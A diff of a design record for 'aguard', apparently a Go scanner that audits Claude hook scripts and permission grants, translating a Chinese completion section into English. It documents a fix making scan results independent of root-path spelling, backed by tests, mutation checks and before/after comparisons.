+   Today, with `--root .claude`, that snippet is `~/.claude/hooks/link.sh → .claude/hooks/link.sh`; after the fix it is an
+   absolute path, identical character for character to the absolute spelling.
+   **Recommendation**: accept it; it does not overstep — "the report does not change with the spelling" is exactly the
+   criterion; `.aguardignore` globs only on the evidence `file` (`internal/ignore/ignore.go`), and the `file` of
+   `HOOK-002` is the artifact name, which does not change, so existing baselines are not affected.
+   **Decided (2026-10-09)**: as recommended (decided in the former repo, kept on port).
+6. **Relative spellings whose parent is not `.`, like `home/.claude`, are broken too; should the criteria widen with them?**
+   It also scores 100 today — `~/…` expands into a relative path, which is then treated as a "relative reference" and
+   joined again. The root cause and the fix are the same as for the other two kinds; no extra code is needed.
+   **Recommendation**: widen them; write it into the table in "Problem" and into the criteria; the title's "with a
+   relative path" is therefore accurate.
+   **Decided (2026-10-09)**: as recommended (decided in the former repo, kept on port).
 
-## 完成
+## Done
 
 ```
-合入:PR #27(2026-10-09;sha 用 git log --grep P-010 找)
-发布:待发
-证据:TestScan_RootSpellingDoesNotChangeTheResult(cmd/aguard/rootspelling_test.go);W1 红:「一个 hook、一个脚本」在 <abs>/、<abs>/.、.claude/、.、./、home/.claude 六种写法下 overall 100,绝对写法 69 → W2 后八种写法都是 69、报告视图逐字等于绝对写法;「各种第二阶段」W1 时八行视图全不同(.claude、../home/.claude 两行只差 HOOK-002 snippet 里 link.sh 解析出的路径是相对的)→ W2 后全同
-证据:TestRun_RootSpellingKeepsTheBoundary(internal/detect/rootspelling_test.go);W1 红六行(<abs>/、<abs>/.、.claude/、.、./、home/.claude:pre.sh、deploy.sh 没读,link.sh 只得 "no such file"、没有 HOOK-002)→ W2 后绿;W4、W5 后十三行全绿
-证据:反向断言 同一测试 —— 十三行里 evil.sh、link.sh、granted.sh 都不被读(无 EXFIL-001、无引用它们的证据),两个 hook 各一条 HOOK-002,hook note 为 "2 × it resolves outside HOME",授权 note 为 "1 × it resolves outside HOME"
-证据:TestRelPath_RelativePathUnderAbsoluteRoot(同文件);W1 红:普通工作目录与经符号链接的工作目录都退化成 scripts/run.sh → W2 后 skills/demo/scripts/run.sh
-证据:反向断言 绝对写法字面值(TestScan_RootSpellingDoesNotChangeTheResult 开头:overall 69、6 条钉住的发现、无 EXFIL-001)W1 时就绿,修后不改一字仍绿;既有边界测试 TestHookScriptOutsideHomeRefused、TestHookQuotedPathWithSpaceOutsideHome、TestHookPermissionRequestOutsideHomeIsHigh、TestPermissionUnits_Boundary、TestRegularFileStillReadThroughSymlink、TestEscapingSymlinkSkillNoted、TestCrossRootSymlinkIgnored 所在文件一字未改,全绿
-证据:变异检查(临时改、跑、还原,未提交):anchorRoot 只 Clean 不 Abs → detect 四行(dot、dot slash、relative through the parent、从软链 root 里用 .)与 cmd 九行红;anchorRoot 改为 EvalSymlinks(Abs(root)) → root 本身是软链的三行红;去掉 relPath 的相对分支 → detect 八行 + TestRelPath 两行 + cmd「各种第二阶段」六行红;relPath 只 Abs 不解析目录 → "工作目录经符号链接"两行(TestRun 一行、TestRelPath 一行)+ 从软链 root 里用 . 一行红;permission.go 的 inBoundary 检查改为 false → detect 十三行全红、cmd「各种第二阶段」红
-证据:二进制前后(main dec64ca vs 本分支,fixture 在 /tmp 下,--inbox off):绝对写法 scan --json 去掉 scanned_at、tool_version 两行后 cmp 无差(经符号链接的 /tmp/… 写法 9305 字节、解析后的 /private/tmp/… 写法 9401 字节);修后 <abs>/ 与 <abs> 只差 root 一行,修前 <abs>/ 少了 hook 的 EXEC-001、授权的 FS-003 和 link.sh 的 HOOK-002;复现表九种写法修后全部 69、都带 EXEC-001@hooks/pre.sh(加授权的那份也都带 FS-003@scripts/deploy.sh)
-证据:真机 ~/.claude:修前修后 overall 69 / artifact 175 / 发现 806 / note 10,JSON 去掉 scanned_at、tool_version 后逐字节相同(15684 行);~/.claude/ 修前 "Granted script not followed" 证据 2 条(绝对写法 1 条,多出的一条是 ~ 下、~/.claude 外的脚本被判成 "resolves outside HOME")→ 修后 1 条,与绝对写法只差 root 一行
-证据:不做什么 —— git diff --stat origin/main -- cmd/aguard/main.go cmd/aguard/gate.go internal/collect internal/detect/hooks.go internal/detect/permission.go docs/spec go.mod go.sum 为空;git diff --stat origin/main -- internal/detect/hooks_test.go internal/detect/detect_test.go internal/detect/nonregular_test.go 为空
-证据:.claude/rules/detect.md 198 → 200 行,TestClaudeRulesAreScopedToExistingPaths 绿(上限 200)
-证据:make verify: all gates passed;go version go1.23.5(无工具链切换),go.mod 第二行 go 1.23.5
+Merged: PR #27 (2026-10-09; find the sha with git log --grep P-010)
+Released: pending release
+Evidence: TestScan_RootSpellingDoesNotChangeTheResult (cmd/aguard/rootspelling_test.go); W1 red: "one hook, one script" has overall 100 under the six spellings <abs>/, <abs>/., .claude/, ., ./, home/.claude, absolute spelling 69 → after W2 all eight spellings are 69 and the report view equals the absolute spelling character for character; in "all second stages" at W1 the view differed in all eight rows (the .claude and ../home/.claude rows differ only in that the path link.sh resolves to in the HOOK-002 snippet is relative) → all identical after W2
+Evidence: TestRun_RootSpellingKeepsTheBoundary (internal/detect/rootspelling_test.go); W1 red in six rows (<abs>/, <abs>/., .claude/, ., ./, home/.claude: pre.sh, deploy.sh not read, link.sh only gets "no such file", no HOOK-002) → green after W2; all thirteen rows green after W4, W5
+Evidence: reverse assertion, same test — in all thirteen rows evil.sh, link.sh, granted.sh are not read (no EXFIL-001, no evidence referencing them), one HOOK-002 per hook, the hook note says "2 × it resolves outside HOME", the grant note says "1 × it resolves outside HOME"
+Evidence: TestRelPath_RelativePathUnderAbsoluteRoot (same file); W1 red: both the plain working directory and the working directory through a symlink degrade to scripts/run.sh → skills/demo/scripts/run.sh after W2
+Evidence: reverse assertion, the literal values of the absolute spelling (start of TestScan_RootSpellingDoesNotChangeTheResult: overall 69, 6 pinned findings, no EXFIL-001) green already at W1, still green after the fix without a single character changed; the files of the existing boundary tests TestHookScriptOutsideHomeRefused, TestHookQuotedPathWithSpaceOutsideHome, TestHookPermissionRequestOutsideHomeIsHigh, TestPermissionUnits_Boundary, TestRegularFileStillReadThroughSymlink, TestEscapingSymlinkSkillNoted, TestCrossRootSymlinkIgnored are unchanged, all green
+Evidence: mutation checks (temporary change, run, restore, not committed): anchorRoot only Clean, no Abs → four detect rows (dot, dot slash, relative through the parent, . from inside a symlinked root) and nine cmd rows red; anchorRoot changed to EvalSymlinks(Abs(root)) → the three rows where the root itself is a symlink red; relative branch of relPath removed → eight detect rows + two TestRelPath rows + six cmd "all second stages" rows red; relPath only Abs without resolving the directory → the two "working directory through a symlink" rows (one in TestRun, one in TestRelPath) + the ". from inside a symlinked root" row red; the inBoundary check in permission.go changed to false → all thirteen detect rows red, cmd "all second stages" red
+Evidence: binary before/after (main dec64ca vs this branch, fixture under /tmp, --inbox off): scan --json for the absolute spelling, after removing the two lines scanned_at, tool_version, shows no difference with cmp (the /tmp/… spelling through the symlink 9305 bytes, the resolved /private/tmp/… spelling 9401 bytes); after the fix <abs>/ differs from <abs> only in the root line, before the fix <abs>/ lacked the hook's EXEC-001, the grant's FS-003 and link.sh's HOOK-002; after the fix all nine spellings of the reproduction table are 69, all with EXEC-001@hooks/pre.sh (and in the fixture with the grant, all with FS-003@scripts/deploy.sh)
+Evidence: real machine ~/.claude: before and after the fix overall 69 / artifacts 175 / findings 806 / notes 10, JSON byte-for-byte identical after removing scanned_at, tool_version (15684 lines); ~/.claude/ before the fix had 2 pieces of "Granted script not followed" evidence (absolute spelling 1; the extra one is a script under ~ but outside ~/.claude judged as "resolves outside HOME") → 1 after the fix, differing from the absolute spelling only in the root line
+Evidence: Out of scope — git diff --stat origin/main -- cmd/aguard/main.go cmd/aguard/gate.go internal/collect internal/detect/hooks.go internal/detect/permission.go docs/spec go.mod go.sum is empty; git diff --stat origin/main -- internal/detect/hooks_test.go internal/detect/detect_test.go internal/detect/nonregular_test.go is empty
+Evidence: .claude/rules/detect.md 198 → 200 lines, TestClaudeRulesAreScopedToExistingPaths green (cap 200)
+Evidence: make verify: all gates passed; go version go1.23.5 (no toolchain switch), line 2 of go.mod is go 1.23.5
 ```
